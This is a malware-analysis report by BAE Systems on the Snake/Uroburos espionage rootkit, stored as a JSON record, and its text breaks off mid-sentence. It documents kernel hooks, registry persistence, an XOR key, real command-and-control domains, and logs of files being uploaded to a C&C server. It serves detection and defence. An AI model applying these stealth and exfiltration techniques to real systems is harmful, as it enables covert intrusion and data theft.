{
    "id": "22520de4-d1b0-47b9-94da-91b9ac487576",
    "created_at": "2022-10-25T16:48:18.272331Z",
    "updated_at": "2025-03-27T02:14:48.540625Z",
    "deleted_at": null,
    "sha1_hash": "0849ce1f0272c4604d47e464ab56cad0b5b60263",
    "title": "Snake Campaign & Cyber Espionage Toolkit",
    "authors": "BAE Systems",
    "file_creation_date": "2014-03-07T09:26:47Z",
    "file_modification_date": "2014-03-07T09:27:03Z",
    "file_size": 4117571,
    "plain_text": "# SNAKE CAMPAIGN\n#### & CYBER ESPIONAGE TOOLKIT\n\n\n-----\n\n## EXECUTIVE SUMMARY\n\n\n-----\n\n##### OVERVIEW\n\n\n###### One of the questions which comes up in the months after big security whitepaper disclosures is: where are they now? In other words, what happened to the operators, tools, and infrastructure which was revealed in the reports, blog-posts, and press interviews.\n\n Did they continue on as before, did they re-build the disclosed infrastructure and tools, did they go away and get jobs in another line of work?\n\n In some cases, the disclosure had little, if any impact on the operation. For example, after the McAfee ShadyRAT report in 2011, there was absolutely no change in the attacks from the group behind this. However, when Mandiant released their APT1 report in 2013, there was a noticeable reduction in activity from the group – and much of the tools and infrastructure has not been seen since.\n\n In the September 2010 issue of Foreign Affairs magazine[1], former US Deputy Secretary of Defense William J. Lynn discussed a cyber-attack which happened two years previously on the DoD’s classified computer networks. Lynn described how a foreign intelligence agency planted malicious code on the networks with the aim of transferring data to servers under their control.\n\n The article included the now oft-quoted phrase ‘digital beachhead’ to describe what was undoubtedly a significant compromise of US military systems. Further reports in the press[2] kept the story alive in 2011, but since then this threat has received remarkably little attention.\n\n However, the operation behind the attacks has continued with little modification to the tools and techniques, in spite of the widespread attention a few years ago. They use highly sophisticated malware tools to maintain persistent access to their targets. These tools can be used for covert communications in a number of different modes, some of which present significant challenges for traditional security technologies to detect.\n\n There are some threats which come and go, whilst there are others which are permanent features of the landscape. In this paper, we describe the tools and techniques of one of the most sophisticated and persistent threats we track. We hope this will help victims identify intrusions and understand their need to improve defences. Cyber security is a collaborative effort – the operation described in this paper again raises the bar for the security community in their efforts to keep up with the attackers in cyber-space\n\n1 [http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain](http://www.foreignaffairs.com/articles/66552/william-j-lynn-iii/defending-a-new-domain)\n2 [http://www reuters com/article/2011/06/17/us usa cybersecurity worm idUSTRE75F5TB20110617](http://www.reuters.com/article/2011/06/17/us-usa-cybersecurity-worm-idUSTRE75F5TB20110617)\n\n\n-----\n\n## TECHNICAL DESCRIPTION\n\n\n-----\n\nWhen antivirus back-end classification platforms cannot identify a malware family for an analysed malicious sample, they assign\ngeneric names, such as “Trojan Horse” or “Agent”. The variant letters are also assigned automatically, by using hexavigesimal\n(or Base26) notation. That is, the variant letters are auto-assigned starting from “A”, followed with “B”, and so on until “Z”. Next\ncomes “AA”, “AB” and so on, until “ZZ”. After that, the variant letters start from “AAA”, “AAB” and so on, until “ZZZ”.\n\nBack in 2008 an unknown malicious file was discovered and auto-classified as “Agent.BTZ”, meaning it was registered as unknown\nmalicious sample #1,898 in an anti-virus classification system. It wasn’t given an actual name, only a generic one.\n\nMeanwhile, internally the authors behind this malware were using their own naming systems - with specific titles for their file\ncomponents and projects such as “snake”, “uroburos”, “sengoku”, and “snark“ used to denote variants of their framework.\n\nA recent report from German security company GData[3] described a sample from the “uroburos” variant of this framework. Their\nreport revealed the complex nature of this malware family, and showed that the operation behind “Agent.BTZ” has continued. As\na result of this disclosure, we are also releasing our own technical analysis of the threat, including a timeline of known samples,\nknown Command-and-Control (C&C) servers, and other indicators to aid investigators in discovering attacks.\n\nReverse engineering of recent malware samples shows these to be much more advanced variants of Agent.BTZ, though still sharing\nmany similarities and encryption methods with the original. Further investigation allowed us to locate related samples compiled\nbetween 2006 and 2014, and spanning across several distinctive generations. The first section of this report gives an overview of\nthe samples collected, where they were reported and the timelines derived from their analysis.\n\nSnake’s architecture turned out to be quite interesting. We have identified two distinct variants, both highly flexible but with two\ndifferent techniques for establishing and maintaining a presence on the target system. In general, its operation relies on kernel\nmode drivers, making it a rootkit. It is designed to covertly install a backdoor on a compromised system, hide the presence of its\ncomponents, provide a communication mechanism with its C&C servers, and enable an effective data exfiltration mechanism. At the\nsame time, Snake exposed a flexibility to conduct its operations by engaging these noticeably different architectures.\n\nIn the first model, the network communications are carried out from the userland - i.e. the area of the computer system where\napplication software executes. In another model, the network communications are handled by a kernel mode driver - i.e. the area\nwhere lower level system code such as device drivers run. The choice of what architecture should be used may depend on a specific\ntarget’s environment, allowing the Snake operators to choose the most suitable architecture to be deployed.\n\nIn both architectures there is a kernel mode driver installed and a usermode DLL injected by the driver into the system processes.\nIn both architectures, there is both 32-bit and 64-bit code involved. In order to distinguish between these architectures, we will call\nthem the usermode-centric and the kernel-centric architectures respectively.\n\nThe remainder of this report gives a detailed explanation of how the two Snake architectures embed themselves in the target\nsystem and communicate with the outside world. We have also provided a set of technical indicators in the Appendix to enable\norganisations and the security research community to identify compromises.\n\n3 https://www.gdata.de/rdk/dl-en-rp-Uroburos\n\n\n-----\n\n##### SNAKE SAMPLES\n\nIn total we have collected over 100 unique files related to this espionage toolkit. Many of these were submitted to online malware\nanalysis websites by victims and investigators over several years. In many cases the source country information of the submission\nis available. These allow us to visualise the distribution of countries where this malware has been seen:\n\n**#Samples** **Submission Year**\n\n**Source country 2010** **2011** **2012** **2013** **2014** **Total**\nUkraine 1 3 6 8 14 32\nLithuania 9 2 11\nGreat Britain 4 4\nBelgium 2 2\nGeorgia 2 2\nUnited States 1 1 2\nRomania 1 1\nHungary 1 1\nItaly 1 1\n**Total** **1** **4** **7** **24** **20** **56**\n\nWhilst this view is likely to only be the tip of the iceberg, it does give us an initial insight into the profile of targets for the Snake\noperations.\n\nOther useful visualisations of the operations come from the compile timestamps. Below is shown a table with a count of the\nnumber of files in our sample set from recent years. Two samples compiled in late January 2014 show that this activity is ongoing.\n\n###### #Samples by compile month\n\n Year 01 02 03 04 05 06 07 08 09 10 11 12 Total 2006 1 3 4 2007 1 1 1 3 2008 2 1 2 1 2 8 2009 1 1 1 3 2 2 10 2010 1 1 1 1 1 2 7 2011 1 4 1 3 1 3 13 2012 2 1 1 1 2 7 14 2013 1 13 5 2 5 4 3 2 1 2 1 39 2014 2 2 Total 8 15 9 4 9 13 6 2 1 11 10 12 100\n\nPlotting the day of the week in which the samples were compiled shows a now familiar pattern for analysts of modern cyber-attacks.\nThe creators of the malware operate a working week, just like any other professional. The single sample in our set which was\ncompiled on a Saturday is an outlier, but doesn’t alter the conclusion. Similarly, plotting the hour of the day in which the samples\nwere compiled reveals another human pattern – the working day. This has been adjusted to UTC+4 to show a possible fit to the\noperators’ local time.\n\n\n#Samples compiled by hour of the day\n(adjusted to UTC+4)\n\n\n30\n\n25\n\n20\n\n15\n\n10\n\n5\n\n0\n\n\n#Samples compiled per day of the week\n\nMon Tue Wed Thu Fri Sat Sun\n\n\n-----\n\n##### USERMODE-CENTRIC ARCHITECTURE\n\n\nThe usermode-centric architecture of Snake is known to have been used from 2011 till 2014, with the most recent sample compiled\non January 28, 2014.\n\nWith this architecture, the Snake driver is mainly used to load the DLL module into the usermode processes, and then use that\nmodule for the communications.\n\nOne of the analysed samples exposed multiple debug messages and source control check-in logs. It is not clear why those\nmessages were allowed in the deployed driver - possibly an operational security lapse. However, they give some insight into the\ninternal structure of the source code.\n\nFor example, the analysed driver gave away the following source file names:\n\n  - d:\\proj\\cn\\fa64\\common\\loadlib\\common/loadlib_helpers.c\n\n  - d:\\proj\\cn\\fa64\\common\\loadlib\\win/loadlib.c\n\n  - d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/libunhook.c\n\n  - d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\ntsystem/libhook.c\n\n  - d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/hook_helpers.c\n\n  - d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/libhook.c\n\n  - d:\\proj\\cn\\fa64\\uroboros\\rk_common\\libhook\\common/idthook.c\n\n  - .\\rk_ntsystem.c\n\n  - ..\\common\\helpers\\interface_s.c\n\n  - ..\\k2\\fa_registry.c\n\n  - ..\\k2\\syshook.c\n\nThe source control check-in log examples, showing the names of the developers to be ‘vlad’ and ‘gilg’:\n\n`•` $Id: snake_config.c 5204 2007-01-04 10:28:19Z vlad $\n\n`•` $Id: mime64.c 12892 2010-06-24 14:31:59Z vlad $\n\n`•` $Id: event.c 14097 2010-11-01 14:46:27Z gilg $\n\n`•` $Id: named_mutex.c 15594 2011-03-18 08:04:09Z gilg $\n\n`•` $Id: nt.c 20719 2012-12-05 12:31:20Z gilg $\n\n`•` $Id: ntsystem.c 19662 2012-07-09 13:17:17Z gilg $\n\n`•` $Id: rw_lock.c 14516 2010-11-29 12:27:33Z gilg $\n\n`•` $Id: rk_bpf.c 14518 2010-11-29 12:28:30Z gilg $\n\n`•` $Id: t_status.c 14478 2010-11-27 12:41:22Z gilg $\n\nIt also exposed the project name of this particular variant as ‘sengoku’:\n\nd:\\proj\\cn\\fa64\\sengoku\\_bin\\sengoku\\win32_debug\\sengoku_Win32.pdb\n\nNow it’s time to execute the driver and see what it does.\n\n\n-----\n\n##### ROOTKIT EXECUTION\n\nWhen first executed, the driver creates device named \\Device\\vstor32 with a symbolic link \\DosDevices\\vstor32.\nThis device is used for userland/kernel communications.\n\nNext, it drops a DLL into the %windows% directory - the DLL is carried in the body of the driver as a binary chunk with\nXOR 0xAA applied on top of it, so the driver decrypts it first.\n\nDepending on the variant, the DLL is dropped either under a random name or a hard-coded name, such as mscpx32n.dll.\n\nThe purpose of this DLL is to be injected into the user-mode processes. Some variants of Snake carry the DLL modules that can be\ninstalled as a service, to be run within taskhost.exe or services.exe processes.\n\nNext, the driver sets up the hooks for the following kernel-mode APIs:\n\n`•` ZwCreateThread\n\n`•` ZwCreateUserProcess\n\n`•` ZwShutdownSystem\n\nAfter that, it calls PsSetCreateProcessNotifyRoutine() in order to be notified whenever a new process is started.\n\nThe handlers of the hooks above along with the notification callback allow Snake to stay persistent on a system, being able to infect\nany newly created processes, and restore its driver file in case it gets deleted.\n\nAnother set of hooks it sets is designed to hide the presence of the Snake components on the system:\n\n`•` ZwQuerySystemInformation\n\n`•` ZwQueryInformationProcess\n\n`•` ZwClose\n\n`•` ZwTerminateProcess\n\nThe driver then watches for all userland processes to see if they load any web pages.\n\nAs long as the user is not using the Internet, Snake stays dormant too, as there is no process that communicates with the web\nservers.\n\nHowever, as soon as the user goes online, the driver intercepts that event and then immediately injects the malicious DLL module\ninto the process that initiated connection (the browser).\n\nOnce injected, the module initiates polling from one of the hard-coded C&C servers.\n\nThe purpose of this behaviour is to blend Snake’s traffic with the browser traffic, bypassing the firewalls, and keeping a low profile\nat the same time. By communicating from within a process that also communicates, even a technically savvy user will find it\nchallenging to detect Snake traffic among legitimate traffic.\n\nThe reason behind such difficulty is because modern web pages often fetch pages from the different web servers, including such\ndata as additional scripts, CSS templates, advertising contents, analytics data, blogs, social networking data, etc. When intercepted\nwith the purpose of analysis, such traffic may literally represent itself hundreds of DNS and HTTP requests made when a popular\nwebsite, such as a news website is open.\n\nHiding a few DNS/HTTP requests among busy network traffic allows Snake rootkit to stay unnoticed.\n\nIn order to test Snake’s communications with the C&C servers, and still being able to clearly distinguish its traffic, a small tool was\nbuilt to generate GET request to a web server running on the analysed system.\n\nThe tool was named as chrome.exe in order to trigger the malware communications.\n\n\n-----\n\n##### COMMAND-AND-CONTROL COMMUNICATIONS\n\nAs long as the test tool named chrome.exe did not make any requests, its memory stayed pristine. There were no injections made\nby the driver.\n\n\nAs soon as the tool made its first GET requests, the driver immediately injected a malicious DLL module in it, and that module\nstarted producing the following traffic:\n\n\nNo.   Time               Source                  Destination              Protocol Length Info\n\n\n###### ↓\n```\n 84 45.990199000 192.168.202.131 31.170.161.136 HTTP 233 GET /D/1/f42cce984070b8ab1c0 HTTP/1.1\n 86 46.216079000 31.170.161.136  192.168.202.131 HTTP 474 HTTP/1.1 302 Found (text/html)\n 94 46.525887000 192.168.202.131 31.170.164.249 HTTP 217 GET /? HTTP/1.1\n101 46.939359000 192.168.202.131 192.168.202.2  DNS  82 Standard query 0x5ae5 A swim.onlinewebshop.net\n102 46.940914000 192.168.202.2  192.168.202.131 DNS  98 Standard query response 0x5ae5 A 83.125.22.197\n107 47.287205000 192.168.202.131 83.125.22.197  HTTP 224 GET /D/pub.txt HTTP/1.1\n109 48.219805000 83.125.22.197  192.168.202.131 HTTP 330 HTTP/1.1 200 OK (text/html)\n\n ↓\n118 48.813394000 192.168.202.131 192.168.202.2  DNS  82 Standard query 0x5362 A july.mypressonline.com\n119 48.814837000 192.168.202.2  192.168.202.131 DNS  98 Standard query response 0x5362 A 83.125.22.197\n123 49.131675000 192.168.202.131 83.125.22.197  HTTP 224 GET /D/pub.txt HTTP/1.1\n125 49.780323000 83.125.22.197  192.168.202.131 HTTP 330 HTTP/1.1 200 OK (text/html)\n\n ↓\n137 50.536285000 192.168.202.131 31.170.161.136 HTTP 220 GET /D/77568289 HTTP/1.1\n139 50.762073000 31.170.161.136  192.168.202.131 HTTP 474 HTTP/1.1 302 Found (text/html)\n147 51.101706000 192.168.202.131 31.170.164.249 HTTP 217 GET /? HTTP/1.1\n154 51.548661000 192.168.202.131 83.125.22.197  HTTP 225 GET /D/77568289 HTTP/1.1\n163 52.014730000 192.168.202.131 83.125.22.197  HTTP 225 GET /D/77568289 HTTP/1.1\n165 52.637958000 83.125.22.197  192.168.202.131 HTTP 679 HTTP/1.1 200 OK (text/html)\n\n```\nReceived command\n\nThe domain names of the C&C servers it relies on are hard-coded in the body of the malware. Some examples are given below, and\na full list of known domains is given in the Appendix D:\n\n`•` north-area.bbsindex.com\n\n`•` winter.site11.com\n\n`•` swim.onlinewebshop.net\n\n`•` july.mypressonline.com\n\n`•` toolsthem.xp3.biz\n\n`•` softprog.freeoda.com\n\n`•` euassociate.6te.net\n\nAs seen in the traffic dump above, the malware first resolves the domain name of its C&C.\nNext, it fetches a file /D/pub.txt, and expects the server to respond with a string “1”, acknowledging it’s active:\n\n03:52:06 1336: Connect swim.onlinewebshop.net type(0)... OK\n\n03:52:06 1336: GET /D/pub.txt\n\n03:52:07 1336: Http status: 200\n\n03:52:07 1336: recv 1/1\n\n03:52:07 DownLoad 1 command(s)\n\nOnce acknowledged, it asks the server for a command, and the server returns a new command to execute:\n\n03:52:11 1404: Connect swim.onlinewebshop.net type(0)... OK\n\n03:52:11 1404: GET /D/77568289\n\n03:52:12 1404: Http status: 200\n\n03:52:12 1404: Command for all\n\n03:52:12 1404: recv 346/346\n\n03:52:12 Command Id:303149772662877808(130201837456870000)[13:42:25 05/08/2013]\n\n\n-----\n\napplies the XOR mask to the bytes that start from offset 0x40:\n\n1dM3uu4j7Fw4sjnbcwlDqet4F7JyuUi4m5Imnxl1pzxI6as80cbLnmz54cs5Ldn4ri3do5L6g\ns923HL34x2f5cvd0fk6c1a0s\n\nAn identical XOR mask was also used by Agent.BTZ.\n\nNext, it calculates and confirms a CRC32 checksum within the command, further decrypts the data by using the Number Theory\nLibrary (NTL), and makes sure the command is destined to the current host by matching the ID field in it.\n\n0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF\n\n00000000 74 E4 7E F4 9E 8E D8 65 B3 06 EB B3 08 EA 3E 84 t.~....e......>.\n00000010 D5 A1 D2 ED 5D 0C 89 91 65 DE 4E B6 0C E2 2C 39 ....]...e.N...,9\n00000020 A9 8A 3D B9 0B C0 E6 12 E9 F9 81 0A CF C3 D9 0C ..=.............\n00000030 5A 6A 15 B4 00 00 00 00 01 00 00 00 00 00 00 00 Zj..............\n00000040 31 64 4D 33 75 75 34 6A 37 46 77 34 73 6A 6E 62 1dM3uu4j7Fw4sjnb\n00000050 13 3D D4 DA 90 F4 BA 35 1C 36 4A 79 69 96 B1 D4 .=.....5.6Jyi...\n00000060 D8 F1 07 6F 7B CC C4 68 9D B7 86 3E 4B 6F BA FB ...o{..h...>Ko..\n00000070 6E AB 7B 29 32 FD 7C 75 B9 DF 7F C0 0C 81 2D 14 n.{)2.|u......-.\n00000080 23 F9 A4 DF D3 F1 18 97 4D CD 71 D0 52 D6 A2 E9 #.......M.q.R...\n00000090 FF 58 30 3D A8 8A DD 4D 3F DB AE 9A F5 07 3B 21 .X0=...M?.....;!\n000000A0 67 5A 34 22 AD 60 CB DD A4 E2 B5 77 A1 6A 4C 2E gZ4”.`.....w.jL.\n000000B0 C8 75 91 01 CA 5B B3 28 3E 55 C8 68 B2 2C 40 E4 .u...[.(>U.h.,@.\n000000C0 02 A9 64 8B 80 BD 0E AB 58 25 00 40 6E AB DD 5B ..d.....X%.@n..[\n000000D0 D1 0A 32 AE 4A E2 60 79 BE 47 10 AE 73 35 4C 65 ..2.J.`y.G..s5Le\n000000E0 06 3C AA D8 F0 49 52 DB 22 A5 0D 7B 2B 4D 8A D1 .<...IR.”..{+M..\n000000F0 21 5C 62 11 E6 13 E2 CA AF A5 4F 5A 9E 1C AF AE !\\b.......OZ....\n00000100 C4 1C 36 4D A0 E4 72 3A CD 07 A3 01 AE E6 0A 84 ..6M..r:........\n00000110 D4 8B 03 FB 0D 68 19 FD 86 71 8E FD FC 2D C3 5C .....h...q...-.\\\n00000120 49 A4 E3 40 9B 77 16 BA 86 4A DD 0D 15 7D B1 BD I..@.w...J...}..\n00000130 A9 54 C3 F6 E4 05 72 B1 E6 B7 A5 A7 31 CE 29 8B .T....r.....1.).\n00000140 EF 95 58 2A 2E 48 0E 7A BD B8 B7 CE 48 32 E2 48 ..X*.H.z....H2.H\n00000150 2E E2 94 65 F0 19 FC F5 ED 1B ...e......\n\n###### ↓ [Traffic is decrypted]\n0 1 2 3 4 5 6 7 8 9 A B C D E F 0123456789ABCDEF\n\n00000000 49 44 33 30 33 31 34 39 37 37 32 36 36 30 38 34 ID30314977266084\n00000010 37 38 30 38 23 30 36 20 26 6D 61 72 6B 65 74 70 7808#06 &marketp\n00000020 6C 61 63 65 2E 73 65 72 76 65 68 74 74 70 2E 63 lace.servehttp.c\n00000030 6F 6D 26 2F 55 50 44 41 54 45 2F 26 63 65 72 74 om&/UPDATE/&cert\n00000040 31 30 32 34 26 55 6E 37 37 6B 6F 23 73 26 26 26 1024&Un77ko#s&&&\n00000050 0A .\n\nOnce decrypted, the malware interprets the received command, as reflected in the malware log below (the new C&C server address\nis highlighted in it):\n\n03:52:12 Del after 0\n\n03:52:12 Run instruction: 6 ID:303149772147483647(13:41:34 05/08/2013)\n\n03:52:12 Add address &marketplace.servehttp.com&/UPDATE/&cert1024&Un77ko#s&&&\n\n03:52:12 Finish run instruction.\n\nAfter that, the malware connects to the new C&C, asking it for another command:\n\n03:52:13 1400: Connect marketplace.servehttp.com type(0)... OK\n\n03:52:13 1400: GET /IMAGE/pub.html\n\n03:52:15 1400: Http status: 200\n\n03:52:16 1400: recv 1/1\n\n03:52:16 DownLoad 1 command(s).\n\n\n-----\n\n03:52:16 UpLoad: http upload 4 file(s).\n\n03:52:17 652: Connect marketplace.servehttp.com type(0)... OK\n\n03:52:17 652: GET test file /IMAGE/pub.html\n\n03:52:17 652: POST /IMAGE/2/55198739672286404661840843638320033\n\n03:52:18 652: C:\\WINDOWS\\$NtUninstallQ812589$\\gstat32.bin 310[B]\n\n03:52:19 652: Http Status:200\n\n03:52:19 652: POST /IMAGE/2/32773318678423920155243775957661252\n\n03:52:19 652: result.xml 1278[B]\n\n03:52:20 652: Http Status:200\n\n03:52:21 652: POST /IMAGE/2/41535327538451061594793127961089611\n\n03:52:21 652: C:\\WINDOWS\\$NtUninstallQ812589$\\mtmon32.sdb 655[B]\n\n03:52:22 652: Http Status:200\n\n03:52:22 652: POST /IMAGE/2/35192812459183876172895945534862460\n\n03:52:22 652: C:\\WINDOWS\\$NtUninstallQ812589$\\mtmon.sdb 748[B]\n\n03:52:23 652: Http Status:200\n\nThe files it uploads are stored inside its home directory %windows%\\$NtUninstallQ[random]$,\nwhere [random] is a random number.\n\nFor example, Snake’s home directory could be C:\\WINDOWS\\$NtUninstallQ812589$.\n\nThe files within that directory are used by the rootkit to store configuration and log data.\n\nWhen decrypted with the same XOR key that was used by Agent.BTZ, these files expose the following contents:\n\n`•` mtmon.sdb - C&C communication log that looks as the logs shown above.\n\n`•` mtmon_.sdb - installation log, that shows infected processes (Internet Explorer), the random name of the dropped DLL\n(e.g. kbdfaori.dll), log directory, and the registry entry ShellCore that stores other configuration details:\n\n03:52:02 TVer=1.2\n\n03:52:02 Parent:C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE\n\n03:52:02 ver 3.2.0.0a inj dll K:0 PID:712,\n\nC:\\WINDOWS\\system32\\kbdfaori.dll,\n\nhostID:ea5cfa5ea1681bd6(16887647987074341846)\n\n03:52:02 C:\\WINDOWS\\$NtUninstallQ812589$,\n\nTemp:C:\\WINDOWS\\$NtUninstallQ812589$\\SPUNINST\\Temp\n\n03:52:02 REG:Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n\n03:52:02 ModuleStart: 03:51:42\n\n`•` scmp.bin - pipe server log that shows its assigned name (COMPUTERNAME is the name of the test system) and\nwhat processes it operates from:\n\n02:04:24 TVer=1.6\n\n02:04:24 SPCOMPUTERNAME: Pipe server thread start\n\n02:04:24 Inj[1620]:explorer.exe\n\n03:51:42 Inj[712]:iexplore.exe\n\n`•` ucmp.bin - another pipe server log:\n\n02:04:44 TVer=1.6\n\n02:04:44 UPCOMPUTERNAME: Pipe server thread start\n\n\n-----\n\n##### INTER-PROCESS COMMUNICATIONS\n\nAnalysis of the sample reveals that it supports 3 modes of fetching C&C commands.\n\n  - In the first mode, it relies on Windows Internet (WinINet) APIs, such as HttpOpenRequest(), HttpSendRequest(),\nInternetReadFile(), etc.\n\n  - In the second mode, it uses Windows Sockets 2 (Winsock) APIs, such as WSAStartup(), socket(), connect(),\nsend(), etc.\n\n  - In the third mode, it works in the ‘pipe server’ mode, when it passes the web requests it is interested in (as a client) to the\npipe server that runs within Windows Explorer (explorer.exe) and/or Internet Explorer (iexplore.exe) processes.\n\nMemory pipes is a common mechanism for Inter-Process Communications (IPC). When the pipe server reads such requests from the\npipes, it performs the web request on behalf of a client by using WinINet APIs, so it effectively serves as a proxy.\n\nThe diagram below demonstrates the last, ‘pipe server’ mode of Snake operation:\n\n\nInternet\n\n\nLegitimate Process\n(e.g. a browser)\n\nUser Mode\n\n###### 2\n\nKernel Mode\n\nSnake’s Kernel Mode\nDriver, with the DLL\nmodule embedded in it\n\nThe diagram illustrates the operation steps 1-4:\n\n\nInjected Snake DLL\n\nLegitimate Process\n(e.g. a browser)\n\n\nFirst, the malicious driver with the embedded DLL module injects that DLL into a system process,\nsuch as services.exe; once loaded, the DLL will function in the ‘pipe server’ mode.\n\n\nAs soon as the driver detects a usermode process that goes online (e.g. a browser), it will inject malicious DLL module\ninto it; depending on the operational mode, the DLL may start communicating with C&C directly.\n\n\nIn the ‘pipe mode’ of operation, the injected DLL will start communicating with the pipe server by sending messages into\nthe established inter-process communication pipes.\n\n\nOnce the task of communication with C&C is delegated to the pipe server, it will start communicating with the C&C,\nbypassing the host-based firewalls that keep an infected system process in a white-list.\n\n\n-----\n\nfriendly system services.\n\nPipe server is a special mode of the injected DLL. In order to switch into that mode, a dedicated thread is spawned to listen for IPC\nmessages received through the pipes. The memory pipes used by Snake are named as:\n\n`•` \\\\.\\Pipe\\SP[COMPUTERNAME]\n\n`•` \\\\.\\Pipe\\UP[COMPUTERNAME]\n\nwhere [COMPUTERNAME] is the name of the host computer.\n\nApart from GET/POST requests, the pipe clients (infected usermode processes) may also ask the pipe server to perform other\noperations on their behalf, such as saving data into a temporary file, copy/delete files, save configuration data into the registry\nunder the aforementioned ShellCore value.\n\nThis delegation of tasks is designed to keep infected processes under the radar of the behavioural analysis tools for as long as\npossible. Another reason is to overcome account restrictions imposed on a browser process in order to be able to write into files/\nregistry.\n\nTo delegate different types of tasks, the clients send messages to the pipe server using the following task identification headers:\n\n`•` DATA\n\n`•` CREATE\n\n`•` CMD\n\n`•` POST\n\n`•` GET\n\n`•` DEL\n\n`•` REGISTR\n\n`•` COPY\n\nThe usermode component of Snake communicates with its kernel-mode driver via a device called \\\\.\\vstor32 (created under\nkernel as \\Device\\vstor32). In its communication protocol with the driver it uses the IOCTL code of 0x222038.\n\nTo write data, it opens the device with CreateFile(“\\\\.\\vstor32”), then calls DeviceIoControl() API on its handle with\nIOCTL code of 0x222038.\n\nConfiguration parameters along with the initial set of domain names are hard-coded within the body of the DLL. However, the data\nappears to be defined in the structures, so it is very likely the DLL could be generated by a stand-alone builder that ‘patches’ the\nDLL with the new/updated list of C&C.\n\nAnalysis of the commands performed by the malware suggests the following capabilities:\n\n  - Scan the network for the presence of other hosts (maximum 1 hour is allocated for this task)\n\n  - Set maximum upload file size\n\n  - Go ‘stealth’ mode for the specified number of days - Snake will not initiate any connections during that time\n\n  - Run specified shell commands and collect the output logs for further delivery\n\n  - Modify settings stored with the registry key HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\ShellCore\n\n  - Search for files\n\n  - Upload specified files\n\n  - Add new C&C domains\n\n  - Update the driver with a new version\n\n  - Download files\n\n  - Run specified executable files\n\n  - Set self-deactivation timeout\n\n  - If the virtual partition \\\\.\\vd1 exists, copy all Snake logs into that partition\n\nTogether, these commands provide complete backdoor functionality, allowing remote attacker full control over the compromised\nsystem.\n\nThe ability to update the driver and then rely on its communication capabilities means that the components of Snake are flexible,\nmaking possible the existence of the hybrid (kernel-centric and usermode-centric) architectures.\n\nFor example, the virtual partitions are used by kernel-centric Snake variants, where the kernel-mode driver is responsible for the\ncommunications. If such a driver is installed via an update, the usermode component can be instructed to delegate the file upload\ntask to the driver by copying all the necessary logs into the shared virtual partition, physically located on the compromised host and\nh ibl f k l\n\n\n-----\n\n##### KERNEL-CENTRIC ARCHITECTURE\n\n\nThis particular architecture relies on a kernel-mode driver to carry out the network communications. The usermode DLLs are still\ninjected into the system processes to perform high-level tasks.\n\nThe delivery mechanism is not known: it may be distributed via a thumb-drive, a phishing email attachment, or be delivered via an\nexploit across the network (e.g. by using the reconnaissance tool that is explained later).\n\nInfection starts from a dropper penetrating into the compromised system where it is allowed to run. Once executed, the dropper\ninstalls the kernel mode driver in a pre-defined location. The dropper itself is 32-bit, so it will run both on 32-bit and 64-bit Windows\nOS (in WoW64 mode). On a 32-bit OS, it will install a 32-bit driver. On a 64-bit OS, it will install a 64-bit driver.\n\nThe analysed 32-bit dropper creates a driver in the following location:\n\n%windows%\\$NtUninstallQ817473$\\fdisk.sys\n\nHowever, different samples may use a different path and driver file name. For example, some samples exposed these filenames:\nfdisk_32.sys, A0009547.sys, or Ultra3.sys. The filename of the dropper could be rkng_inst.exe or fdisk_mon.exe.\n\n##### REGISTRATION\n\nOnce executed, the driver first makes sure it is registered under a pre-defined name, such as Ultra3.\n\nOther samples may have a different registration name, such as ~ROOT. The registration is ensured with creation of the following\nregistry entries:\n\nErrorControl = 0\nGroup = “Streams Drivers”\nImagePath = %windows%\\$NtUninstallQ817473$\\fdisk.sys\nStart = 1 [SYSTEM]\nType = 1\n\nin the newly created registry key\n\nHKEY_LOCAL_MACHINE\\System\\CurrentControlSer\\Services\\Ultra3\n\nThe driver then flags the following events with the notification purposes:\n\n\\BaseNamedObjects\\{B93DFED5-9A3B-459b-A617-59FD9FAD693E}\n\\BaseNamedObjects\\shell.{F21EDC09-85D3-4eb9-915F-1AFA2FF28153}\n\nThe rootkit then places a number of the hooks.\n\n##### SYSTEM HOOKS\n\nThe first API it hooks is IoCreateDevice(). The installed hook handler calls the original API and then checks if the name of the\ndevice is netbt or afd. If so, it will install a TDI filter driver. If the device name is Null, Beep, tcpip or Nsiproxy, it will activate\nitself by enabling its hooks designed to hide the presence of Snake on a system, set up its access control lists and the messaging\nsystem.\n\nIn order to hide its components, the driver hooks the following APIs:\n\n`•` ZwQueryKey\n\n`•` ZwEnumerateKey\n\n`•` ZwCreateKey\n\n`•` ZwSaveKey\n\n`•` ZwReadFile\n\n`•` ZwQuerySystemInformation\n\n`•` ZwQueryInformationProcess\n\n`•` ZwClose\n\n`•` ZwTerminateProcess\n\n`•` ZwShutdownSystem\n\n\n-----\n\ndriver. In one example, the rootkit blocks access to registry entries that contain the strings Ultra3 and ~ROOT .\n\nThe ZwReadFile() hook handler will block access to the home directory where the rootkit keeps its file. In one of the analysed\nkernel-centric Snake samples the home directory was hard-coded as %windows%\\$NtUninstallQ817473$, so it blocked file\nread access from that directory.\n\nThe ZwClose() hook handler is used to inject the DLL module into the userland processes.\n\nThe hook handler for ZwTerminateProcess() checks if the process being shut down is svchost.exe. If so, it considers\nit to be a system shutdown, so it unloads its usermode DLL and deactivates its own network drivers, just like it does when its\nZwShutdownSystem() hook handler gets invoked.\n\nThe ObOpenObjectByName() hook is designed to hide the presence of its virtual partitions (described later).\n\nTo encrypt data stored on its virtual partitions, the driver sets a hook for another API:\n\nIofCallDriver()\n\nTo re-infect the usermode process svchost.exe and to re-enable its network drivers, the rootkit hooks these APIs:\n\n`•` ZwCreateThread\n\n`•` ZwCreateUserProcess\n\n##### WFP CALLOUT DRIVER\n\nSnake then proceeds to the task of deep packet inspection and modification.\n\nIn order to accomplish it, it registers a callout driver for Windows Filtering Platform (WFP), an architecture first introduced with\nWindows Vista and nowadays normally used by antivirus and/or intrusion detection systems to inspect/block malicious traffic.\n\nSnake sets filters at the layers FWPM_LAYER_STREAM_V4 and FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4 in the TCP/\nIP stack, so that its callout driver is notified whenever a TCP connection is established by a browser. When that happens, the\nrootkit triggers an event named 